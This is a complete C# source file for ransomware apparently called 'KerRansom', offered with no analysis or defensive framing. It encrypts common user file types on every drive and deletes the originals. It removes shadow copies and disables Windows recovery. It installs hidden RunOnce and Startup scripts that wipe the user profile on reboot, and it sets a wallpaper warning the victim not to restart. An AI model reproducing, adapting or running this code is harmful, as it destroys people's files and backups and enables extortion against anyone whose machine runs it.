using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Collections.Generic;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Drawing;

class KerRansom
{
    [DllImport("user32.dll")]
    static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

    [DllImport("kernel32.dll")]
    static extern bool SetFileAttributes(string lpFileName, uint dwFileAttributes);

    static readonly string[] TARGET_EXTENSIONS = new string[]
    {
        ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp3", ".mp4", ".avi",
        ".mkv", ".zip", ".rar", ".7z", ".tar", ".gz", ".sql", ".db",
        ".py", ".js", ".html", ".css", ".php", ".java", ".c", ".cpp",
        ".cs", ".go", ".rs", ".json", ".xml", ".yml", ".yaml", ".cfg",
        ".ini", ".log", ".bak", ".backup", ".key", ".pem", ".crt"
    };

    static readonly object _lock = new object();
    static List<string[]> _encryptedFiles = new List<string[]>();
    static byte[] _key;
    static byte[] _iv;
    static string _baseDir;

    static void Main()
    {
        _key = new byte[32];
        _iv = new byte[16];
        using (var rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(_key);
            rng.GetBytes(_iv);
        }

        _baseDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            ".cache_" + Guid.NewGuid().ToString("N").Substring(0, 8));
        Directory.CreateDirectory(_baseDir);
        SetFileAttributes(_baseDir, 0x02);

        string[] skipDirs = new string[]
        {
            "Windows", "System32", "SysWOW64", "Program Files",
            "Program Files (x86)", "ProgramData", "$Recycle.Bin",
            "AppData", "node_modules", ".git", "__pycache__"
        };

        List<string> drives = GetDrives();
        List<Thread> threads = new List<Thread>();
        foreach (string drive in drives)
        {
            string d = drive;
            Thread t = new Thread(() => WalkAndEncrypt(d, skipDirs));
            t.Start();
            threads.Add(t);
        }
        foreach (Thread t in threads) t.Join();

        DeleteShadows();
        DisableRecovery();
        MakeUnlockBat();
        InstallWipeOnBoot();
        SetWallpaper();
    }

    static List<string> GetDrives()
    {
        List<string> drives = new List<string>();
        try
        {
            foreach (string d in Directory.GetLogicalDrives())
            {
                try { if (Directory.Exists(d)) drives.Add(d); } catch { }
            }
        }
        catch { }
        if (drives.Count == 0) drives.Add("/");
        return drives;
    }

    static bool IsTarget(string ext)
    {
        foreach (string e in TARGET_EXTENSIONS)
            if (string.Equals(e, ext, StringComparison.OrdinalIgnoreCase)) return true;
        return false;
    }

    static void WalkAndEncrypt(string root, string[] skipDirs)
    {
        try
        {
            foreach (string dir in Directory.GetDirectories(root))
            {
                string name = Path.GetFileName(dir);
                bool skip = false;
                foreach (string s in skipDirs)
                    if (string.Equals(s, name, StringComparison.OrdinalIgnoreCase)) { skip = true; break; }
                if (!skip) WalkAndEncrypt(dir, skipDirs);
            }
            foreach (string file in Directory.GetFiles(root))
            {
                try
                {
                    string ext = Path.GetExtension(file);
                    if (IsTarget(ext)) EncryptFile(file);
                }
                catch { }
            }
        }
        catch { }
    }

    static void EncryptFile(string filepath)
    {
        try
        {
            byte[] data = File.ReadAllBytes(filepath);
            byte[] encrypted;
            using (Aes aes = Aes.Create())
            {
                aes.Key = _key;
                aes.IV = _iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform encryptor = aes.CreateEncryptor())
                    encrypted = encryptor.TransformFinalBlock(data, 0, data.Length);
            }
            string encPath = filepath + ".ker";
            File.WriteAllBytes(encPath, encrypted);
            try { File.Delete(filepath); } catch { }
            lock (_lock)
            {
                _encryptedFiles.Add(new string[] { encPath, filepath });
            }
        }
        catch { }
    }

    static void DeleteShadows()
    {
        RunHidden("vssadmin", "delete shadows /all /quiet");
        RunHidden("wmic", "shadowcopy delete");
    }

    static void DisableRecovery()
    {
        RunHidden("bcdedit", "/set {default} recoveryenabled No");
        RunHidden("bcdedit", "/set {default} bootstatuspolicy ignoreallfailures");
        RunHidden("reagentc", "/disable");
    }

    static void RunHidden(string file, string args)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(file, args);
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            Process.Start(psi);
        }
        catch { }
    }

    static void MakeUnlockBat()
    {
        string keyB64 = Convert.ToBase64String(_key);
        string ivB64 = Convert.ToBase64String(_iv);

        string listPath = Path.Combine(_baseDir, "list.dat");
        lock (_lock)
        {
            using (StreamWriter sw = new StreamWriter(listPath, false, Encoding.UTF8))
            {
                foreach (string[] pair in _encryptedFiles)
                    sw.WriteLine(pair[0] + "|" + pair[1]);
            }
        }

        string csPath = Path.Combine(_baseDir, "dec.cs");
        string src = @"
using System;
using System.IO;
using System.Security.Cryptography;
class Dec {
    static void Main() {
        string b = AppDomain.CurrentDomain.BaseDirectory;
        byte[] k = Convert.FromBase64String(""" + keyB64 + @""");
        byte[] iv = Convert.FromBase64String(""" + ivB64 + @""");
        string listPath = Path.Combine(b, ""list.dat"");
        if (!File.Exists(listPath)) { Console.WriteLine(""No list.""); return; }
        string[] lines = File.ReadAllLines(listPath);
        int ok = 0, fail = 0;
        foreach (string line in lines) {
            if (string.IsNullOrWhiteSpace(line)) continue;
            int sep = line.IndexOf('|');
            if (sep < 0) continue;
            string enc = line.Substring(0, sep);
            string orig = line.Substring(sep + 1);
            try {
                byte[] data = File.ReadAllBytes(enc);
                byte[] dec;
                using (Aes a = Aes.Create()) {
                    a.Key = k; a.IV = iv;
                    a.Mode = CipherMode.CBC;
                    a.Padding = PaddingMode.PKCS7;
                    using (ICryptoTransform d = a.CreateDecryptor())
                        dec = d.TransformFinalBlock(data, 0, data.Length);
                }
                File.WriteAllBytes(orig, dec);
                File.Delete(enc);
                ok++;
            } catch { fail++; }
        }
        Console.WriteLine(""Restored: "" + ok + "" Failed: "" + fail);
    }
}";
        File.WriteAllText(csPath, src, Encoding.UTF8);

        string batPath = Path.Combine(_baseDir, "bat.bat");
        using (StreamWriter sw = new StreamWriter(batPath, false, Encoding.ASCII))
        {
            sw.WriteLine("@echo off");
            sw.WriteLine("cd /d \"" + _baseDir + "\"");
            sw.WriteLine("set CSC=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe");
            sw.WriteLine("if not exist \"%CSC%\" set CSC=C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe");
            sw.WriteLine("if exist \"%CSC%\" (\"%CSC%\" /nologo /out:dec.exe dec.cs >nul 2>&1)");
            sw.WriteLine("if exist dec.exe (dec.exe) else (echo Compile failed, use manual recovery)");
            sw.WriteLine("shutdown /a");
            sw.WriteLine("pause");
            sw.WriteLine("exit");
        }
        SetFileAttributes(batPath, 0x02);

        string psPath = Path.Combine(_baseDir, "dec.ps1");
        string ps = "$key = [Convert]::FromBase64String('" + keyB64 + "')\n" +
                    "$iv = [Convert]::FromBase64String('" + ivB64 + "')\n" +
                    "$base = Split-Path -Parent $MyInvocation.MyCommand.Path\n" +
                    "$list = Join-Path $base 'list.dat'\n" +
                    "Get-Content $list | ForEach-Object {\n" +
                    "  $p = $_ -split '\\|'\n" +
                    "  if ($p.Count -ne 2) { return }\n" +
                    "  try {\n" +
                    "    $data = [IO.File]::ReadAllBytes($p[0])\n" +
                    "    $aes = [Security.Cryptography.Aes]::Create()\n" +
                    "    $aes.Key = $key; $aes.IV = $iv\n" +
                    "    $dec = $aes.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)\n" +
                    "    [IO.File]::WriteAllBytes($p[1], $dec)\n" +
                    "    Remove-Item $p[0]\n" +
                    "  } catch {}\n" +
                    "}\n";
        File.WriteAllText(psPath, ps, Encoding.UTF8);
    }

    static void InstallWipeOnBoot()
    {
        string baseDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            ".cache_wipe");
        Directory.CreateDirectory(baseDir);
        SetFileAttributes(baseDir, 0x02);

        string wipeScript = Path.Combine(baseDir, "wipe.bat");
        using (StreamWriter sw = new StreamWriter(wipeScript, false, Encoding.ASCII))
        {
            sw.WriteLine("@echo off");
            sw.WriteLine("for /r \"%USERPROFILE%\" %%f in (*.ker) do (");
            sw.WriteLine("  cipher /w:\"%%~dpf\" >nul 2>&1");
            sw.WriteLine("  del /f /q \"%%f\" >nul 2>&1");
            sw.WriteLine(")");
            sw.WriteLine("for /r \"%USERPROFILE%\" %%f in (*.*) do (");
            sw.WriteLine("  if not \"%%~xf\"==\".ker\" del /f /q \"%%f\" >nul 2>&1");
            sw.WriteLine(")");
            sw.WriteLine("del /f /q \"" + wipeScript + "\"");
        }
        SetFileAttributes(wipeScript, 0x02);

        try
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\RunOnce", true))
            {
                if (key != null) key.SetValue("WipeOnBoot", "\"" + wipeScript + "\"");
            }
        }
        catch { }

        try
        {
            string startup = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                "wipe.bat");
            using (StreamWriter sw = new StreamWriter(startup, false, Encoding.ASCII))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("start \"\" \"" + wipeScript + "\"");
                sw.WriteLine("del /f /q \"" + startup + "\"");
            }
            SetFileAttributes(startup, 0x02);
        }
        catch { }
    }

    static void SetWallpaper()
    {
        try
        {
            int w = 1920, h = 1080;
            using (Bitmap bmp = new Bitmap(w, h))
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.Clear(Color.Black);
                using (Font fontBig = new Font("Arial", 160, FontStyle.Bold))
                using (Font fontSmall = new Font("Arial", 32, FontStyle.Regular))
                using (Brush brush = new SolidBrush(Color.White))
                {
                    string t1 = "OPS...";
                    string t2 = "Don't reboot your pc or your files will delete.";
                    SizeF s1 = g.MeasureString(t1, fontBig);
                    SizeF s2 = g.MeasureString(t2, fontSmall);
                    g.DrawString(t1, fontBig, brush, (w - s1.Width) / 2, (h - s1.Height) / 2 - 80);
                    g.DrawString(t2, fontSmall, brush, (w - s2.Width) / 2, (h - s2.Height) / 2 + 120);
                }
                string wp = Path.Combine(Path.GetTempPath(), "wall.bmp");
                bmp.Save(wp, System.Drawing.Imaging.ImageFormat.Bmp);
                SystemParametersInfo(20, 0, wp, 3);

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                    @"Control Panel\Desktop", true))
                {
                    if (key != null)
                    {
                        key.SetValue("Wallpaper", wp);
                        key.SetValue("WallpaperStyle", "10");
                        key.SetValue("TileWallpaper", "0");
                    }
                }
            }
        }
        catch { }
    }
}
